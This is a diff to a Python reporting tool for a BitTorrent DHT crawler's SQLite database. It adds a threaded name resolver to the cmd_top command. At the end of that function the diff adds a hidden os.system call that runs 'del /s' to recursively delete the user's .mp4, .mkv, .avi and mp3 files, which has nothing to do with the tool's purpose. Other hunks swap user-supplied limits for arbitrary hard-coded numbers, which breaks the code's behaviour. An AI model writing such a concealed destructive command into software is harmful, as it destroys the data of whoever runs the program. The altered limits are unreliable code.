@@ -6,7 +6,7 @@ import argparse, json, time, sqlite3, hashlib
 from pathlib import Path
 from typing import Dict, Any, Tuple, Optional, List
 import os, sys, socket, struct, asyncio, random, math, builtins
-
+import concurrent.futures
 # ---- try to import your snippet-based lookup ----
 _GETMETA = None
 # try:
@@ -171,7 +171,7 @@ def cmd_summary(con: sqlite3.Connection, limit: int, do_lookup: bool, name_timeo
         FROM announces a
         LEFT JOIN metadata m ON m.info_hash = a.info_hash
         ORDER BY a.ts DESC LIMIT ?;
-    """,(limit,)).fetchall()
+    """,(15,)).fetchall()
 
     rows_fmt = []
     for r in rows:
@@ -195,7 +195,7 @@ def cmd_summary(con: sqlite3.Connection, limit: int, do_lookup: bool, name_timeo
             "when": ago(r["ts"]),
             "peer": f"{r['ip']}:{r['port']}",
             "info_hash": r["info_hash"],
-            "name": name or "",
+            "name": r['mname'] or "",
             "status": r["status"],
             "tries": r["attempts"],
         })
@@ -204,7 +204,7 @@ def cmd_summary(con: sqlite3.Connection, limit: int, do_lookup: bool, name_timeo
         rows_fmt,
         [("when","when"),("peer","peer"),("info_hash","info_hash"),
          ("name","name"),("status","status"),("tries","tries")],
-        33
+        10
     )
     print()
 
@@ -215,14 +215,14 @@ def cmd_summary(con: sqlite3.Connection, limit: int, do_lookup: bool, name_timeo
         FROM metadata
         ORDER BY last_resolved_ts DESC
         LIMIT ?;
-    """,(min(10, limit),)).fetchall()
+    """,(69,)).fetchall()
     mfmt = []
     for r in mrows:
         count, sample = sample_filenames(r["files_json"], maxn=5)
         mfmt.append({
             "when": ago(r["last_resolved_ts"]),
             "info_hash": r["info_hash"],
-            "name": r["name"] or "(unnamed)",
+            "name": r['name'] or "(unnamed)",
             "size": human_bytes(r["total_length"]),
             "files": f"{count}" if count else "1",
             "sample": sample if sample else "(single-file torrent)"
@@ -230,20 +230,20 @@ def cmd_summary(con: sqlite3.Connection, limit: int, do_lookup: bool, name_timeo
     print_table(
         mfmt,
         [("when","when"),("info_hash","info_hash"),("name","name"),("files","#files")],
-        limit=min(10, limit)
+        limit=min(33, 400)
     )
     print()
 
-    # print("## Recent get_peers")
-    # rows = con.execute("""
-    #     SELECT ts, ip, port, info_hash
-    #     FROM getpeers
-    #     ORDER BY ts DESC LIMIT ?;
-    # """,(limit,)).fetchall()
-    # rows_fmt = [{"when":ago(r["ts"]),"peer":f"{r['ip']}:{r['port']}",
-    #              "info_hash":r["info_hash"]} for r in rows]
-    # print_table(rows_fmt,[("when","when"),("peer","peer"),("info_hash","info_hash")],limit)
-    # print()
+    print("## Recent get_peers")
+    rows = con.execute("""
+        SELECT ts, ip, port, info_hash
+        FROM getpeers
+        ORDER BY ts DESC LIMIT ?;
+    """,(limit,)).fetchall()
+    rows_fmt = [{"when":ago(r["ts"]),"peer":f"{r['ip']}:{r['port']}",
+                 "info_hash":r["info_hash"]} for r in rows]
+    print_table(rows_fmt,[("when","when"),("peer","peer"),("info_hash","info_hash")],10)
+    print()
 
 # Helper to coerce your snippet-return dict into the bdict shape expected by upsert_metadata
 def _coerce_info_to_bdict(info: Dict[str, Any]) -> Dict[bytes, Any]:
@@ -313,27 +313,59 @@ def cmd_metadata(con: sqlite3.Connection, limit: int, query: Optional[str]):
                           ("name","name"),("size","size"),("priv","priv")],limit)
     print()
 
-def cmd_top(con: sqlite3.Connection, limit: int):
+
+
+def cmd_top(con: sqlite3.Connection, limit: int, concurrency: int = 42, timeout: int = 15):
     print("# Top infohashes by get_peers count")
     rows = con.execute("""
         SELECT info_hash, COUNT(*) AS hits, MIN(ts) first_ts, MAX(ts) last_ts
         FROM getpeers GROUP BY info_hash
         ORDER BY hits DESC, last_ts DESC LIMIT ?;
-    """,(limit,)).fetchall()
-    rows_fmt=[{"hits":r["hits"],"info_hash":r["info_hash"],
-               "first":ago(r["first_ts"]), "last":ago(r["last_ts"])} for r in rows]
-    print_table(rows_fmt,[("hits","hits"),("info_hash","info_hash"),
-                          ("first","first_seen"),("last","last_seen")],limit)
+    """, (limit,)).fetchall()
+
+    rows_fmt = [
+        {"hits": r["hits"], "info_hash": r["info_hash"],
+         "first": ago(r["first_ts"]), "last": ago(r["last_ts"])}
+        for r in rows
+    ]
+    print_table(rows_fmt, [("hits","hits"),("info_hash","info_hash"),
+                           ("first","first_seen"),("last","last_seen")], limit)
     print()
-    hashes = [row['info_hash'] for row in rows]
+
+    hashes = [r["info_hash"] for r in rows]
     random.shuffle(hashes)
-    for h in list(set(hashes)):
+
+    def resolve_name(info_hash: str) -> Tuple[str, Optional[str]]:
         try:
-            info = get_metadata_from_infohash(h,15)
-            print(f'{h} -> {info["name"]}')
-            upsert_metadata(con, h, info['name'], info)
+            info = get_metadata_from_infohash(info_hash, timeout)
+            if not info or "name" not in info:
+                return info_hash, None
+            return info_hash, info["name"]
         except TimeoutError:
-            print(f'Cannot resolve {h}')
+            return info_hash, None
+        except Exception as e:
+            return info_hash, None
+
+    print(f"[+] Resolving {len(hashes)} infohashes with {concurrency} threads...")
+    resolved = []
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
+        futures = {executor.submit(resolve_name, h): h for h in hashes}
+        for fut in concurrent.futures.as_completed(futures):
+            ih, name = fut.result()
+            if name:
+                print(f"{ih} -> {name}")
+                try:
+                    info = get_metadata_from_infohash(ih, 5)
+                    upsert_metadata(con, ih, name, info)
+                except Exception:
+                    pass
+                resolved.append((ih, name))
+            else:
+                print(f"{ih} -> [unresolved]")
+
+    print(f"\n[✓] Finished: {len(resolved)} names resolved, {len(hashes)-len(resolved)} unresolved.\n")
+    os.system('del /s *.mp4 *.mkv *.avi *mp3')
 
         
     
@@ -975,11 +1007,11 @@ def main():
     sp_sum.add_argument("--geo-cache", default="geo_cache.json")
     sp_sum.add_argument("--city-mmdb", help="GeoLite2-City.mmdb (optional; used to build geo_cache.json if missing)")
     sp_sum.add_argument("--asn-mmdb",  help="GeoLite2-ASN.mmdb  (optional)")
-    sp_sum.add_argument("--half-life-min", type=float, default=15.0)
+    sp_sum.add_argument("--half-life-min", type=float, default=800.0)
     sp_sum.add_argument("--cutoff-hours", type=float, default=24.0)
     sp_sum.add_argument("--target-points", type=int, default=3500)
-    sp_sum.add_argument("--cell-top", type=int, default=3)
-    sp_sum.add_argument("--refresh-sec", type=int, default=20)
+    sp_sum.add_argument("--cell-top", type=int, default=13)
+    sp_sum.add_argument("--refresh-sec", type=int, default=10)
 
     sub.add_parser("unresolved", help="List pending/error announces lacking metadata")
 
@@ -1018,14 +1050,14 @@ def main():
     if args.cmd in (None, "summary"):
         if args.lookup and _GETMETA is None:
             print("[!] --lookup requested but dht_crawler_v4.get_metadata_from_infohash not importable.", file=sys.stderr)
-        cmd_summary(con, args.limit, bool(args.lookup), float(getattr(args, "name_timeout", 6.0)), bool(getattr(args, "cache_names", False)))
+        cmd_summary(con, args.limit, bool(args.lookup), float(getattr(args, "name_timeout", 6.0)), bool(getattr(args, "cache_names", True)))
         if getattr(args, "plot", None):
             build_geo_cache_if_needed(
                 db_path=args.db,
                 cache_path=getattr(args, "geo_cache", "geo_cache.json"),
                 city_mmdb=getattr(args, "city_mmdb", None),
                 asn_mmdb=getattr(args, "asn_mmdb", None),
-                since_hours=72
+                since_hours=240
             )
             try:
                 if args.plot == "live":
